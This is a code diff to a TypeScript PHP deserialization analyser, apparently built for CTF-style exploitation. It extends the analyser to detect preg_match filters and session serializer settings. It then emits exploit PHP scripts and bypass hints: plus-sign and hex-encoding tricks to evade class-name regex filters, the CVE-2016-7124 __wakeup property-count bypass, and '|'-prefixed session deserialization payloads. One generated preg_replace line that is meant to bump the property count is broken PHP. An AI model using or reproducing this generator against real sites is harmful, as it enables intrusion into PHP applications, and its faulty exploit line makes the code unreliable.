@@ -94,6 +94,22 @@ export interface WakeupReset {
     line: number;
 }
 
+// 正则过滤信息
+export interface RegexFilter {
+    pattern: string;
+    line: number;
+    targetClass?: string;
+    description: string;
+    bypassMethods: string[];  // 绕过方法列表
+}
+
+// Session 处理器信息
+export interface SessionHandler {
+    handler: 'php' | 'php_serialize' | 'php_binary' | 'unknown';
+    line: number;
+    file?: string;  // 哪个文件设置的
+}
+
 export interface ChainStep {
     className: string;
     methodName: string;
@@ -133,9 +149,12 @@ export interface POPChainResult {
     payloadObject?: PayloadObject;  // 结构化的payload对象
     paramName?: string;      // unserialize 的参数名 (如 'data')
     paramSource?: string;    // 参数来源 (如 '$_GET')
-    vulnType?: 'pop_chain' | 'property_injection' | 'wakeup_bypass';  // 漏洞类型
+    vulnType?: 'pop_chain' | 'property_injection' | 'wakeup_bypass' | 'session_deserialize';  // 漏洞类型
     bypassWakeup?: boolean;  // 是否需要绕过 __wakeup
     useBase64?: boolean;     // 是否需要 base64 编码
+    regexFilters?: RegexFilter[];  // 检测到的正则过滤
+    sessionHandlers?: SessionHandler[];  // 检测到的session处理器
+    bypassHints?: string[];  // 绕过提示
 }
 
 export interface EntryPoint {
@@ -179,6 +198,12 @@ export class POPChainDetector {
     private gadgetMap: Map<string, POPGadget> = new Map();
     private ast: any;
     private sourceCode: string = '';
+    // 存储检测到的 unserialize 参数信息
+    private unserializeParam: { paramName?: string; paramSource?: string; useBase64?: boolean } = {};
+    // 存储检测到的正则过滤
+    private regexFilters: RegexFilter[] = [];
+    // 存储检测到的 session 处理器
+    private sessionHandlers: SessionHandler[] = [];
 
     constructor() {
         this.parser = new phpParser.Engine({
@@ -219,14 +244,17 @@ export class POPChainDetector {
         
         return props;
     }
-    // 存储检测到的 unserialize 参数信息
-    private unserializeParam: { paramName?: string; paramSource?: string; useBase64?: boolean } = {};
 
     /**
      * 主入口 - 检测POP链
      */
     public findPOPChains(code: string): POPChainResult[] {
         this.sourceCode = code;
+        
+        // 重置检测状态
+        this.unserializeParam = {};
+        this.regexFilters = [];
+        this.sessionHandlers = [];
         
         try {
             this.ast = this.parser.parseCode(code, 'php');
@@ -235,8 +263,10 @@ export class POPChainDetector {
             return [];
         }
 
-        // 0. 检测 unserialize 调用参数
+        // 0. 检测 unserialize 调用参数、正则过滤、Session 处理器
         this.detectUnserializeParams();
+        this.detectRegexFilters();
+        this.detectSessionHandlers();
 
         // 1. 构建类映射
         this.buildClassMap();
@@ -369,6 +399,153 @@ export class POPChainDetector {
         if (node.kind === 'identifier') return node.name;
         if (node.kind === 'variable') return node.name;
         return undefined;
+    }
+
+    /**
+     * 检测正则过滤 - 用于检测如 preg_match('/O:\d+:"User"/', $data) 这样的过滤
+     */
+    private detectRegexFilters(): void {
+        this.regexFilters = [];
+        this.traverseForRegexFilters(this.ast);
+        
+        if (this.regexFilters.length > 0) {
+            console.log(`检测到 ${this.regexFilters.length} 个正则过滤:`);
+            this.regexFilters.forEach(f => {
+                console.log(`  - ${f.pattern} (line ${f.line})`);
+            });
+        }
+    }
+
+    private traverseForRegexFilters(node: any): void {
+        if (!node) return;
+
+        // 检测 preg_match('/pattern/', $data)
+        if (node.kind === 'call' && node.what) {
+            const funcName = node.what.name || '';
+            if (funcName === 'preg_match' && node.arguments && node.arguments.length > 0) {
+                const patternArg = node.arguments[0];
+                if (patternArg.kind === 'string') {
+                    const pattern = patternArg.value || '';
+                    const line = node.loc?.start?.line || 0;
+                    
+                    // 分析模式，提取绕过方法
+                    const bypassMethods = this.analyzeRegexBypass(pattern);
+                    let targetClass: string | undefined;
+                    
+                    // 尝试从正则中提取类名
+                    const classMatch = pattern.match(/["'](\w+)["']/);
+                    if (classMatch) {
+                        targetClass = classMatch[1];
+                    }
+                    
+                    this.regexFilters.push({
+                        pattern,
+                        line,
+                        targetClass,
+                        description: `正则过滤检测: ${pattern}`,
+                        bypassMethods
+                    });
+                }
+            }
+        }
+
+        // 遍历子节点
+        if (Array.isArray(node)) {
+            node.forEach(child => this.traverseForRegexFilters(child));
+        } else if (typeof node === 'object') {
+            for (const key of Object.keys(node)) {
+                if (key === 'loc' || key === 'leadingComments' || key === 'trailingComments') continue;
+                const child = node[key];
+                if (child && typeof child === 'object') {
+                    this.traverseForRegexFilters(child);
+                }
+            }
+        }
+    }
+
+    /**
+     * 分析正则模式，提供绕过方法
+     */
+    private analyzeRegexBypass(pattern: string): string[] {
+        const bypasses: string[] = [];
+        
+        // 检测 O:\d+: 模式 - 可以用 O:+4: 或 O:4: (带加号) 绕过
+        if (pattern.includes('O:\\d+')) {
+            bypasses.push('使用 + 号绕过: O:+4:"ClassName" 代替 O:4:"ClassName"');
+            bypasses.push('使用 %00 填充: O:4%00:"ClassName"');
+        }
+        
+        // 检测类名匹配 - 可以用大小写、十六进制等绕过
+        if (pattern.includes('"') && !pattern.includes('/i')) {
+            bypasses.push('如果没有 /i 修饰符，尝试修改大小写');
+        }
+        
+        // 检测是否过滤了特定类名
+        const classMatch = pattern.match(/["'](\w+)["']/);
+        if (classMatch) {
+            const className = classMatch[1];
+            bypasses.push(`尝试使用 \\x 十六进制编码类名: 如 ${className[0]} -> \\x${className.charCodeAt(0).toString(16)}`);
+            bypasses.push(`使用大写 S: 字符串格式: S:${className.length}:"\\x${className.charCodeAt(0).toString(16)}${className.slice(1)}"`);
+        }
+        
+        return bypasses;
+    }
+
+    /**
+     * 检测 Session 序列化处理器设置
+     */
+    private detectSessionHandlers(): void {
+        this.sessionHandlers = [];
+        this.traverseForSessionHandlers(this.ast);
+        
+        if (this.sessionHandlers.length > 0) {
+            console.log(`检测到 ${this.sessionHandlers.length} 个 Session 处理器设置:`);
+            this.sessionHandlers.forEach(h => {
+                console.log(`  - ${h.handler} (line ${h.line})`);
+            });
+        }
+    }
+
+    private traverseForSessionHandlers(node: any): void {
+        if (!node) return;
+
+        // 检测 ini_set('session.serialize_handler', 'php_serialize')
+        if (node.kind === 'call' && node.what) {
+            const funcName = node.what.name || '';
+            if (funcName === 'ini_set' && node.arguments && node.arguments.length >= 2) {
+                const keyArg = node.arguments[0];
+                const valueArg = node.arguments[1];
+                
+                if (keyArg.kind === 'string' && keyArg.value === 'session.serialize_handler') {
+                    let handler: 'php' | 'php_serialize' | 'php_binary' | 'unknown' = 'unknown';
+                    
+                    if (valueArg.kind === 'string') {
+                        const value = valueArg.value || '';
+                        if (value === 'php') handler = 'php';
+                        else if (value === 'php_serialize') handler = 'php_serialize';
+                        else if (value === 'php_binary') handler = 'php_binary';
+                    }
+                    
+                    this.sessionHandlers.push({
+                        handler,
+                        line: node.loc?.start?.line || 0
+                    });
+                }
+            }
+        }
+
+        // 遍历子节点
+        if (Array.isArray(node)) {
+            node.forEach(child => this.traverseForSessionHandlers(child));
+        } else if (typeof node === 'object') {
+            for (const key of Object.keys(node)) {
+                if (key === 'loc' || key === 'leadingComments' || key === 'trailingComments') continue;
+                const child = node[key];
+                if (child && typeof child === 'object') {
+                    this.traverseForSessionHandlers(child);
+                }
+            }
+        }
     }
 
     /**
@@ -1284,7 +1461,10 @@ export class POPChainDetector {
                     paramName: this.unserializeParam.paramName,
                     paramSource: this.unserializeParam.paramSource,
                     vulnType: 'property_injection',
-                    bypassWakeup: needsBypassWakeup
+                    bypassWakeup: needsBypassWakeup,
+                    regexFilters: this.regexFilters.length > 0 ? this.regexFilters : undefined,
+                    sessionHandlers: this.sessionHandlers.length > 0 ? this.sessionHandlers : undefined,
+                    bypassHints: this.generateBypassHints(gadget.className, needsBypassWakeup)
                 };
 
                 results.push(result);
@@ -1474,8 +1654,37 @@ export class POPChainDetector {
     ): string {
         let code = `<?php\n/**\n * 属性注入漏洞利用\n * 目标: ${className}::$${condition.propertyName} = ${JSON.stringify(condition.targetValue)}\n`;
         if (needsBypassWakeup) {
-            code += ` * 注意: 需要绕过 __wakeup (CVE-2016-7124)\n`;
+            code += ` * 注意: 需要绕过 __wakeup (CVE-2016-7124, PHP < 7.4.26)\n`;
         }
+        
+        // 添加正则过滤绕过提示
+        if (this.regexFilters.length > 0) {
+            code += ` *\n * 检测到正则过滤:\n`;
+            this.regexFilters.forEach(f => {
+                code += ` *   - ${f.pattern}\n`;
+                if (f.bypassMethods.length > 0) {
+                    code += ` *   绕过方法:\n`;
+                    f.bypassMethods.forEach(m => {
+                        code += ` *     ${m}\n`;
+                    });
+                }
+            });
+        }
+        
+        // 添加 Session 反序列化提示
+        if (this.sessionHandlers.length > 0) {
+            code += ` *\n * 检测到 Session 处理器:\n`;
+            this.sessionHandlers.forEach(h => {
+                code += ` *   - ${h.handler}\n`;
+            });
+            const hasPhpSerialize = this.sessionHandlers.some(h => h.handler === 'php_serialize');
+            if (hasPhpSerialize) {
+                code += ` *\n * Session 反序列化利用:\n`;
+                code += ` *   在当前页面提交: |<序列化字符串>\n`;
+                code += ` *   在使用默认 php 处理器的页面触发反序列化\n`;
+            }
+        }
+        
         code += ` */\n\n`;
 
         // 生成类定义
@@ -1524,8 +1733,35 @@ export class POPChainDetector {
         if (needsBypassWakeup) {
             code += `// === 绕过 __wakeup (修改属性数量) ===\n`;
             code += `// 将 ${className}:X: 改为 ${className}:(X+1):\n`;
-            code += `$payload = preg_replace('/O:(\\d+):"${className}":(\\d+):/', 'O:$1:"${className}":' . ($2 + 1) . ':', $payload);\n`;
-            code += `// 或者手动: 将属性数量加1\n\n`;
+            code += `$payload = preg_replace('/O:(\\d+):"${className}":(\\d+):/', 'O:$1:"${className}":' . ('\\$2' + 1) . ':', $payload);\n`;
+            code += `// 或者手动: 将属性数量加1\n`;
+            code += `// 注意: 此方法仅在 PHP < 7.4.26 有效\n\n`;
+        }
+
+        // 正则绕过示例
+        if (this.regexFilters.length > 0) {
+            const classFilter = this.regexFilters.find(f => 
+                f.pattern.includes(className) || (f.targetClass && f.targetClass === className)
+            );
+            
+            if (classFilter) {
+                code += `// === 绕过正则过滤 ===\n`;
+                if (classFilter.pattern.includes('O:\\d+')) {
+                    code += `// 原始: ${this.getSerializedPrefix(className, allProps.length)}\n`;
+                    code += `// 使用 +: O:+${className.length}:"${className}":${allProps.length}:\n`;
+                    code += `$payload_bypass = str_replace('O:${className.length}:"', 'O:+${className.length}:"', $payload);\n`;
+                    code += `echo "Payload (regex bypass):\\n" . urlencode($payload_bypass) . "\\n\\n";\n\n`;
+                }
+            }
+        }
+
+        // Session 反序列化 payload
+        if (this.sessionHandlers.some(h => h.handler === 'php_serialize')) {
+            code += `// === Session 反序列化 Payload ===\n`;
+            code += `// 在表单中提交以下内容:\n`;
+            code += `$session_payload = '|' . $payload;\n`;
+            code += `echo "Session Payload:\\n" . $session_payload . "\\n\\n";\n`;
+            code += `echo "Session Payload (URL):\\n" . urlencode($session_payload) . "\\n\\n";\n\n`;
         }
 
         // 输出
@@ -1550,6 +1786,13 @@ export class POPChainDetector {
         if (typeof value === 'string') return `"${value}"`;
         if (typeof value === 'number') return String(value);
         return 'null';
+    }
+
+    /**
+     * 获取序列化前缀
+     */
+    private getSerializedPrefix(className: string, propCount: number): string {
+        return `O:${className.length}:"${className}":${propCount}:`;
     }
 
     /**
@@ -1805,7 +2048,10 @@ export class POPChainDetector {
             exploitMethod,
             dataFlow,
             paramName: this.unserializeParam.paramName,
-            paramSource: this.unserializeParam.paramSource
+            paramSource: this.unserializeParam.paramSource,
+            regexFilters: this.regexFilters.length > 0 ? this.regexFilters : undefined,
+            sessionHandlers: this.sessionHandlers.length > 0 ? this.sessionHandlers : undefined,
+            bypassHints: this.generateBypassHints(gadget.className, false)
         };
     }
 
@@ -2337,6 +2583,66 @@ export class POPChainDetector {
         return steps.map((step, i) => 
             `[${i + 1}] ${step.className}::${step.methodName} (${step.trigger})`
         ).join(' → ');
+    }
+
+    /**
+     * 生成绕过提示 - 基于检测到的过滤器和防御措施
+     */
+    private generateBypassHints(targetClass: string, needsBypassWakeup: boolean): string[] {
+        const hints: string[] = [];
+        
+        // __wakeup 绕过提示
+        if (needsBypassWakeup) {
+            hints.push('⚠️ __wakeup 绕过: 修改属性数量 (CVE-2016-7124, 仅在 PHP < 7.4.26 有效)');
+            hints.push('  方法: 将 O:4:"User":2: 改为 O:4:"User":3: (属性数量+1)');
+            hints.push('  注意: PHP 7.4+ 已修复此漏洞，需要寻找其他绕过方法');
+        }
+        
+        // 正则过滤绕过提示
+        if (this.regexFilters.length > 0) {
+            hints.push('\n🔒 检测到正则过滤:');
+            for (const filter of this.regexFilters) {
+                hints.push(`  模式: ${filter.pattern} (line ${filter.line})`);
+                if (filter.targetClass && filter.targetClass === targetClass) {
+                    hints.push(`  ⚠️ 此过滤针对目标类 ${targetClass}`);
+                }
+                if (filter.bypassMethods.length > 0) {
+                    hints.push('  绕过方法:');
+                    filter.bypassMethods.forEach(method => {
+                        hints.push(`    - ${method}`);
+                    });
+                }
+            }
+        }
+        
+        // Session 反序列化提示
+        if (this.sessionHandlers.length > 0) {
+            hints.push('\n🔐 检测到 Session 序列化处理器:');
+            for (const handler of this.sessionHandlers) {
+                hints.push(`  处理器: ${handler.handler} (line ${handler.line})`);
+            }
+            
+            // 如果检测到 php_serialize，提示可能存在 session 反序列化漏洞
+            const hasPhpSerialize = this.sessionHandlers.some(h => h.handler === 'php_serialize');
+            const hasPhp = this.sessionHandlers.some(h => h.handler === 'php');
+            
+            if (hasPhpSerialize || hasPhp) {
+                hints.push('\n💡 Session 反序列化攻击提示:');
+                hints.push('  如果存在多个文件使用不同的处理器，可能存在 session 反序列化漏洞');
+                hints.push('  利用方法:');
+                hints.push('    1. 在使用 php_serialize 的页面注入: |O:4:"User":1:{...}');
+                hints.push('    2. | 符号前的内容会被 php 处理器当作键名');
+                hints.push('    3. | 符号后的内容会被反序列化');
+                hints.push('    4. 访问使用默认 php 处理器的页面触发反序列化');
+                
+                if (hasPhpSerialize) {
+                    hints.push('\n  当前文件使用 php_serialize 处理器，可以在这里注入 payload');
+                    hints.push('  寻找使用默认 php 处理器的其他页面来触发');
+                }
+            }
+        }
+        
+        return hints;
     }
 
     /**
